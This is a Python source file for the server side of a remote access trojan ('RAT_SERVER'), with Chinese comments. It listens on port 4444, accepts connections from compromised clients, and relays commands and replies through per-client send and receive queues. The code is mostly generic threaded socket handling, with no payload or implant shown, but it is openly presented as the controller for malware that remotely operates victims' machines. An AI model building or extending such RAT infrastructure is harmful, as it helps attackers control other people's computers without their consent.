import socket
import threading
from terminal import Terminal
from queue import Queue
import threading
class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = []
        self.on_client_connected = None
        self.on_client_disconnected = None
    
    def build_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for the client...")
        
        while True:
            client, addr = s.accept()  # 接收客户端连接
            print("client:", client)
            print("addr:", addr)
            client_thread = threading.Thread(target=self.handle_client, args=(client, addr))  # 创建一个线程来处理客户端连接
            client_thread.start()  # 启动线程
            
    def handle_client(self, client, addr):
        # 从客户端接收数据，获取客户端的IP地址
        ipcli = client.recv(1024).decode()
        print(f"[*] Connection is established successfully with {ipcli}")
        # 将客户端的连接信息添加到self.clients列表中，包括客户端socket对象、地址、两个队列用于发送和接收消息
        self.clients.append((client, *addr, Queue(), Queue()))
        # self.on_client_connected(*addr)
        # 创建两个线程，一个用于发送消息，一个用于接收消息
        send_thread = threading.Thread(target=self.send_msg, args=(self.clients[-1][3], client))
        recv_thread = threading.Thread(target=self.recv_msg, args=(self.clients[-1][4], client))
        # 启动线程
        send_thread.start()
        recv_thread.start()
        # 等待接收线程完成
        recv_thread.join()
        # 关闭客户端连接
        client.close()
        # 等待发送线程完成
        send_thread.join()

    def get_client(self, ip, port) :
        for client, ip_tmp, port_tmp, send_buf, recv_buf in self.clients:
            if ip_tmp== ip and port_tmp == int(port):
                return client, send_buf, recv_buf
        raise Exception("Client not found")
    
    
    def send_msg(self, buf: Queue, client: socket.socket):
        while True:
            try:
                if buf.empty() is False:
                    msg = buf.get()
                    print(f"send {msg}")
                    client.send(msg.encode())
            except Exception as e:
                break
    
    def recv_msg(self, buf: Queue, client: socket.socket):
        print('recv start...')
        while True:
            try:
                msg = client.recv(1024).decode()
                print(f"recv {msg}")
                buf.put(msg)
            except Exception as e:
                break
                
        
    
    
if __name__ == "__main__":
    host = "127.0.0.1"
    port = 4444
    rat = RAT_SERVER(host, port)
    rat.build_connection()